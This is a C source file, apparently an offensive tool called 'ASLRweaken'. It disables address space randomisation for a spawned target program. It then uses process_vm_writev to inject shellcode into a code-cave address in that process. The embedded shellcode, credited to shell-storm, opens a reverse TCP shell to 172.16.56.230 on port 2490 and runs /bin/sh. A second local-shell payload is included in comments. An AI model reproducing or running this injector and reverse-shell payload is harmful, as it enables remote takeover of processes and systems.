#define _GNU_SOURCE
#include <stdio.h>            // printf 
#include <string.h>           // strerror
#include <stdlib.h>           // exit
#include <errno.h>            // errno
#include <unistd.h>           // sleep
#include <sys/personality.h>  // personality
#include <sys/wait.h> 
#include <stdbool.h>
#include <sys/ptrace.h>
#include <sys/user.h>         // user_regs_struct
#include <sys/uio.h>


// ASLRweaken <templates_code_cave_addr_hex> <code_cave_sz>
// ASLRweaken 0x555555559260 400

void DumpHex(const void* data, size_t size);

int main(int argc, char** argv) { 
    errno = 0;

    int m_personality_orig;
    pid_t pid;
  
    char *pargv[] = { "/path/to/template", "prtl", 0 };
    extern char** environ;

    if (argc < 2) {
        printf("usage: %s <mem address> [len]\n", argv[0]);
        printf("  <mem> - Memory address to target\n");
        printf("  [len] - Length (in bytes) to dump\n");
        return -1;
    }
   
    // create a child process
    printf("Before fork: PPID: %d PID: %d\n", getppid(), getpid());
    pid = fork();
    printf("After fork: PPID: %d PID: %d\n", getppid(), getpid());
  
    if (0 > pid) {
        printf("Error during forking: %s\n", strerror(errno));
        exit(1);
    }
  
    // child process
    if (0 == pid) {
        printf("In child: PPID: %d PID: %d\n", getppid(), getpid());
        m_personality_orig = personality (0xffffffff);
        if (errno == 0 && !(m_personality_orig & ADDR_NO_RANDOMIZE)) {
            personality (m_personality_orig | ADDR_NO_RANDOMIZE);
            if (errno == 0) {
                printf("Unrandomized OK. PID: %d\n", getpid());
                printf("About to execve()\n");
                execve(pargv[0], pargv, environ);
                printf("After execve()\n");
            }else{
                printf("Error disabling address space randomization: %s\n", strerror(errno));
                exit(1);
            }
        }else{
            printf("Error saving personality: %s\n", strerror(errno));
            exit(1);
        }
  }

  // parent process
  printf("In Parent: Self PID: %d Child PID: %d\n", getpid(), pid);

  printf("Child PID: %zd\n", pid);

  sleep(1);
  void *remotePtr = (void *)strtol(argv[1], NULL, 0);
  printf("Remote target address of %llx\n", remotePtr);

  size_t bufferLength = (argc > 2) ? strtol(argv[2], NULL, 10) : 20;
  printf("Buffer size of %d bytes.\n", bufferLength);

  
  // Launch reverse TCP (118b)
  // http://shell-storm.org/shellcode/files/shellcode-857.php
  // shellcode = r'\xc0\x80\x10\x0a' ; '.'.join([str(int(x,16)) for x in shellcode.replace('\\','').split('x')[1:]])



#define IPADDR "\xac\x10\x38\xe6"     // 172.16.56.230
#define PORT   "\x09\xba"             // 2490

  /* 
    48 31 C0 48 31 FF 48 31  F6 48 31 D2 4D 31 C0 6A  |  H1.H1.H1.H1.M1.j 
    02 5F 6A 01 5E 6A 06 5A  6A 29 58 0F 05 49 89 C0  |  ._j.^j.Zj)X..I.. 
    48 31 F6 4D 31 D2 41 52  C6 04 24 02 66 C7 44 24  |  H1.M1.AR..$.f.D$ 
    02 09 BA C7 44 24 04 AC  10 38 E6 48 89 E6 6A 10  |  ....D$...8.H..j. 
    5A 41 50 5F 6A 2A 58 0F  05 48 31 F6 6A 03 5E 48  |  ZAP_j*X..H1.j.^H 
    FF CE 6A 21 58 0F 05 75  F6 48 31 FF 57 57 5E 5A  |  ..j!X..u.H1.WW^Z 
    48 BF 2F 2F 62 69 6E 2F  73 68 48 C1 EF 08 57 54  |  H.//bin/shH...WT 
    5F 6A 3B 58 0F 05 00 00  00 00 00 00 00 00 00 00  |  _j;X............ 
  */

  char* sc = "\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a"
             "\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0"
             "\x48\x31\xf6\x4d\x31\xd2\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24"
             "\x02"PORT"\xc7\x44\x24\x04"IPADDR"\x48\x89\xe6\x6a\x10"
             "\x5a\x41\x50\x5f\x6a\x2a\x58\x0f\x05\x48\x31\xf6\x6a\x03\x5e\x48"
             "\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a"
             "\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54"
             "\x5f\x6a\x3b\x58\x0f\x05";

  // Launch local /bin/sh
  // 6A 42 58 FE C4 48 99 52  48 BF 2F 62 69 6E 2F 2F  |  jBX..H.RH./bin// 
  // 73 68 57 54 5E 49 89 D0  49 89 D2 0F 05
  // char* sc = "\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf"
  //            "\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54"
  //            "\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05";

  // Build iovec structs
  struct iovec local[1];
  struct iovec remote[1];

  local[0].iov_base = calloc(bufferLength, sizeof(char));
  local[0].iov_len = bufferLength;

  memcpy(local[0].iov_base, sc, strlen(sc) );

  printf("Local sc buffer: \n");
  DumpHex(local[0].iov_base, local[0].iov_len);


  remote[0].iov_base = remotePtr;
  remote[0].iov_len = bufferLength;

  printf("Sleeping before injection\n");
  sleep(6);
  // Call process_vm_readv - handle any error codes
    ssize_t nread = process_vm_writev(pid, local, 1, remote, 1, 0);
    if (nread < 0) {
        switch (errno) {
            case EINVAL:
              printf("ERROR: INVALID ARGUMENTS.\n");
              break;
            case EFAULT:
              printf("ERROR: UNABLE TO ACCESS TARGET MEMORY ADDRESS.\n");
              break;
            case ENOMEM:
              printf("ERROR: UNABLE TO ALLOCATE MEMORY.\n");
              break;
            case EPERM:
              printf("ERROR: INSUFFICIENT PRIVILEGES TO TARGET PROCESS.\n");
              break;
            case ESRCH:
              printf("ERROR: PROCESS DOES NOT EXIST.\n");
              break;
            default:
              printf("ERROR: AN UNKNOWN ERROR HAS OCCURRED.\n");
        }

        return -1;
    }

    printf(" * Executed process_vm_writev, sent %zd bytes.\n", nread);
    printf("Remote sc buffer: \n");
    DumpHex(local[0].iov_base, local[0].iov_len);

    int status;
    wait(&status);
    return 0;
}


void DumpHex(const void* data, size_t size) {
    char ascii[17];
    size_t i, j;
    ascii[16] = '\0';
    for (i = 0; i < size; ++i) {
        printf("%02X ", ((unsigned char*)data)[i]);
        if (((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~') {
            ascii[i % 16] = ((unsigned char*)data)[i];
        } else {
            ascii[i % 16] = '.';
        }
        if ((i+1) % 8 == 0 || i+1 == size) {
            printf(" ");
            if ((i+1) % 16 == 0) {
                printf("|  %s \n", ascii);
            } else if (i+1 == size) {
                ascii[(i+1) % 16] = '\0';
                if ((i+1) % 16 <= 8) {
                    printf(" ");
                }
                for (j = (i+1) % 16; j < 16; ++j) {
                    printf("   ");
                }
                printf("|  %s \n", ascii);
            }
        }
    }
}
